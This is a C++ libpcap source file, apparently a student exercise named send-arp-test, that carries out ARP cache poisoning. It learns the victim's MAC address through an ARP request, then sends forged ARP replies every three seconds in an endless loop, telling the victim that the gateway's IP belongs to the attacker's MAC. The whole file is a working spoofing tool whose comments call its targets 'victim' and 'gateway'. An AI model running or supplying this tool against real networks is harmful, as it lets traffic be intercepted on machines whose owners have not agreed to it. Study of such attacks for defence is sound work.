#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <stddef.h>
#include <stdint.h>

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp-test eth0 172.30.1.3 172.30.1.254\n");
}

void mac_to_str (char *rtn, u_char *mac);
int get_my_mac (char *device, char *mac);
int get_my_ip (char *device, char *my_ip);
int get_victim_mac (char *device, char *my_mac, char *v_mac, char *v_ip, char *my_ip);
int send_arp_reply (char *device, char *my_mac, char *victim_mac, char *victim_ip, char *target_ip);

int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
    }

    char *device = argv[1];
    char *sender_ip = argv[2];
    char *target_ip = argv[3];
    int ret;

    // get my mac
    char my_mac[18];
    ret = get_my_mac(device, my_mac);
    if (ret < 0) return -1;

    // get my ip
    char my_ip[16];
    ret = get_my_ip(device, my_ip);
    if (ret < 0) return -1;

    // get victim mac (sender)
    char victim_mac[18];
    ret = get_victim_mac(device, my_mac, victim_mac, sender_ip, my_ip);
    if (ret < 0) return -1;

    // attack! (send ARP infection Reply packet)
    while (true) {
        printf("send spoofing packet!\n");
        int ret = send_arp_reply(device, my_mac, victim_mac, sender_ip, target_ip);
        if (ret < 0) return -1;
        sleep(3);
    }

}

int get_my_mac(char *device, char *mac)
{
    // ------------------------------- googling..
    struct ifreq ifr;
    unsigned char *mac_addr = NULL;

    memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, device);

    int sock = socket(AF_UNIX, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "socket error\n");
        return -1;
    }

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        fprintf(stderr, "ioctl error\n");
        return -1;
    }

    mac_addr = (unsigned char *) ifr.ifr_hwaddr.sa_data;
    // ------------------------------- end of googling code

    // write my mac address to buffer
    mac_to_str(mac, mac_addr);
    printf("--- Get My MAC Address ---\n");
    close(sock);

    return 0;
}

int get_my_ip(char *device, char *my_ip){
    // ------------------------------- googling..
    struct ifreq ifr;

    memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, device);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "socket error\n");
        return -1;
    }

    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        fprintf(stderr, "ioctl error\n");
        return -1;
    }

    struct sockaddr_in *sin;
    sin = (struct sockaddr_in*)&ifr.ifr_addr;
    strcpy(my_ip, inet_ntoa(sin->sin_addr));

    close(sock);
    // ------------------------------- end of googling code

    printf("--- Get My IP Address ---\n");

    return 0;
}

void mac_to_str (char *rtn, u_char *mac) // convert 6 bytes mac address to string format
{
    snprintf(rtn, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2],
             mac[3], mac[4], mac[5]);
}

int get_victim_mac(char *device, char *my_mac, char *v_mac, char *v_ip, char *my_ip)
{
    // pcap open
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(device, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
        return -1;
    }

    // send ARP Request
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");   // broadcast
    packet.eth_.smac_ = Mac(my_mac);                // my mac
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(my_mac);                // my mac
    packet.arp_.sip_ = htonl(Ip(my_ip));            // my ip
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");   // broadcast
    packet.arp_.tip_ = htonl(Ip(v_ip));             // target

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return -1;
    }

    // receive ARP Reply
    while (true) {
        struct pcap_pkthdr *pcap_header;
        const u_char *packet;

        int res = pcap_next_ex(handle, &pcap_header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            fprintf(stderr, "pcap_next_ex error (%d) %s\n", res, pcap_geterr(handle));
            return res;
        }

        struct EthArpPacket *eth_arp = (struct EthArpPacket *)packet;
        struct in_addr s;

        s.s_addr = ntohl(eth_arp->arp_.sip());
        char *sip = inet_ntoa(s);

        if (eth_arp->eth_.type_ != htons(EthHdr::Arp)) continue;
        if (eth_arp->arp_.op_ != htons(ArpHdr::Reply)) continue;
        if (strncmp(sip, v_ip, strlen(v_ip)) != 0) continue;

        printf("--- Catch Victim's MAC address ---\n");
        mac_to_str(v_mac, eth_arp->arp_.smac_);

        break;
    }
    return 0;
}

int send_arp_reply(char *device, char *my_mac, char *victim_mac, char *victim_ip, char *target_ip)
{
    // pcap open
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(device, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
        return -1;
    }

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(victim_mac);        // victim
    packet.eth_.smac_ = Mac(my_mac);            // attacker
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(my_mac);            // attacker
    packet.arp_.sip_ = htonl(Ip(target_ip));    // gateway
    packet.arp_.tmac_ = Mac(victim_mac);        // victim
    packet.arp_.tip_ = htonl(Ip(victim_ip));    // victim

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
    return 0;
}
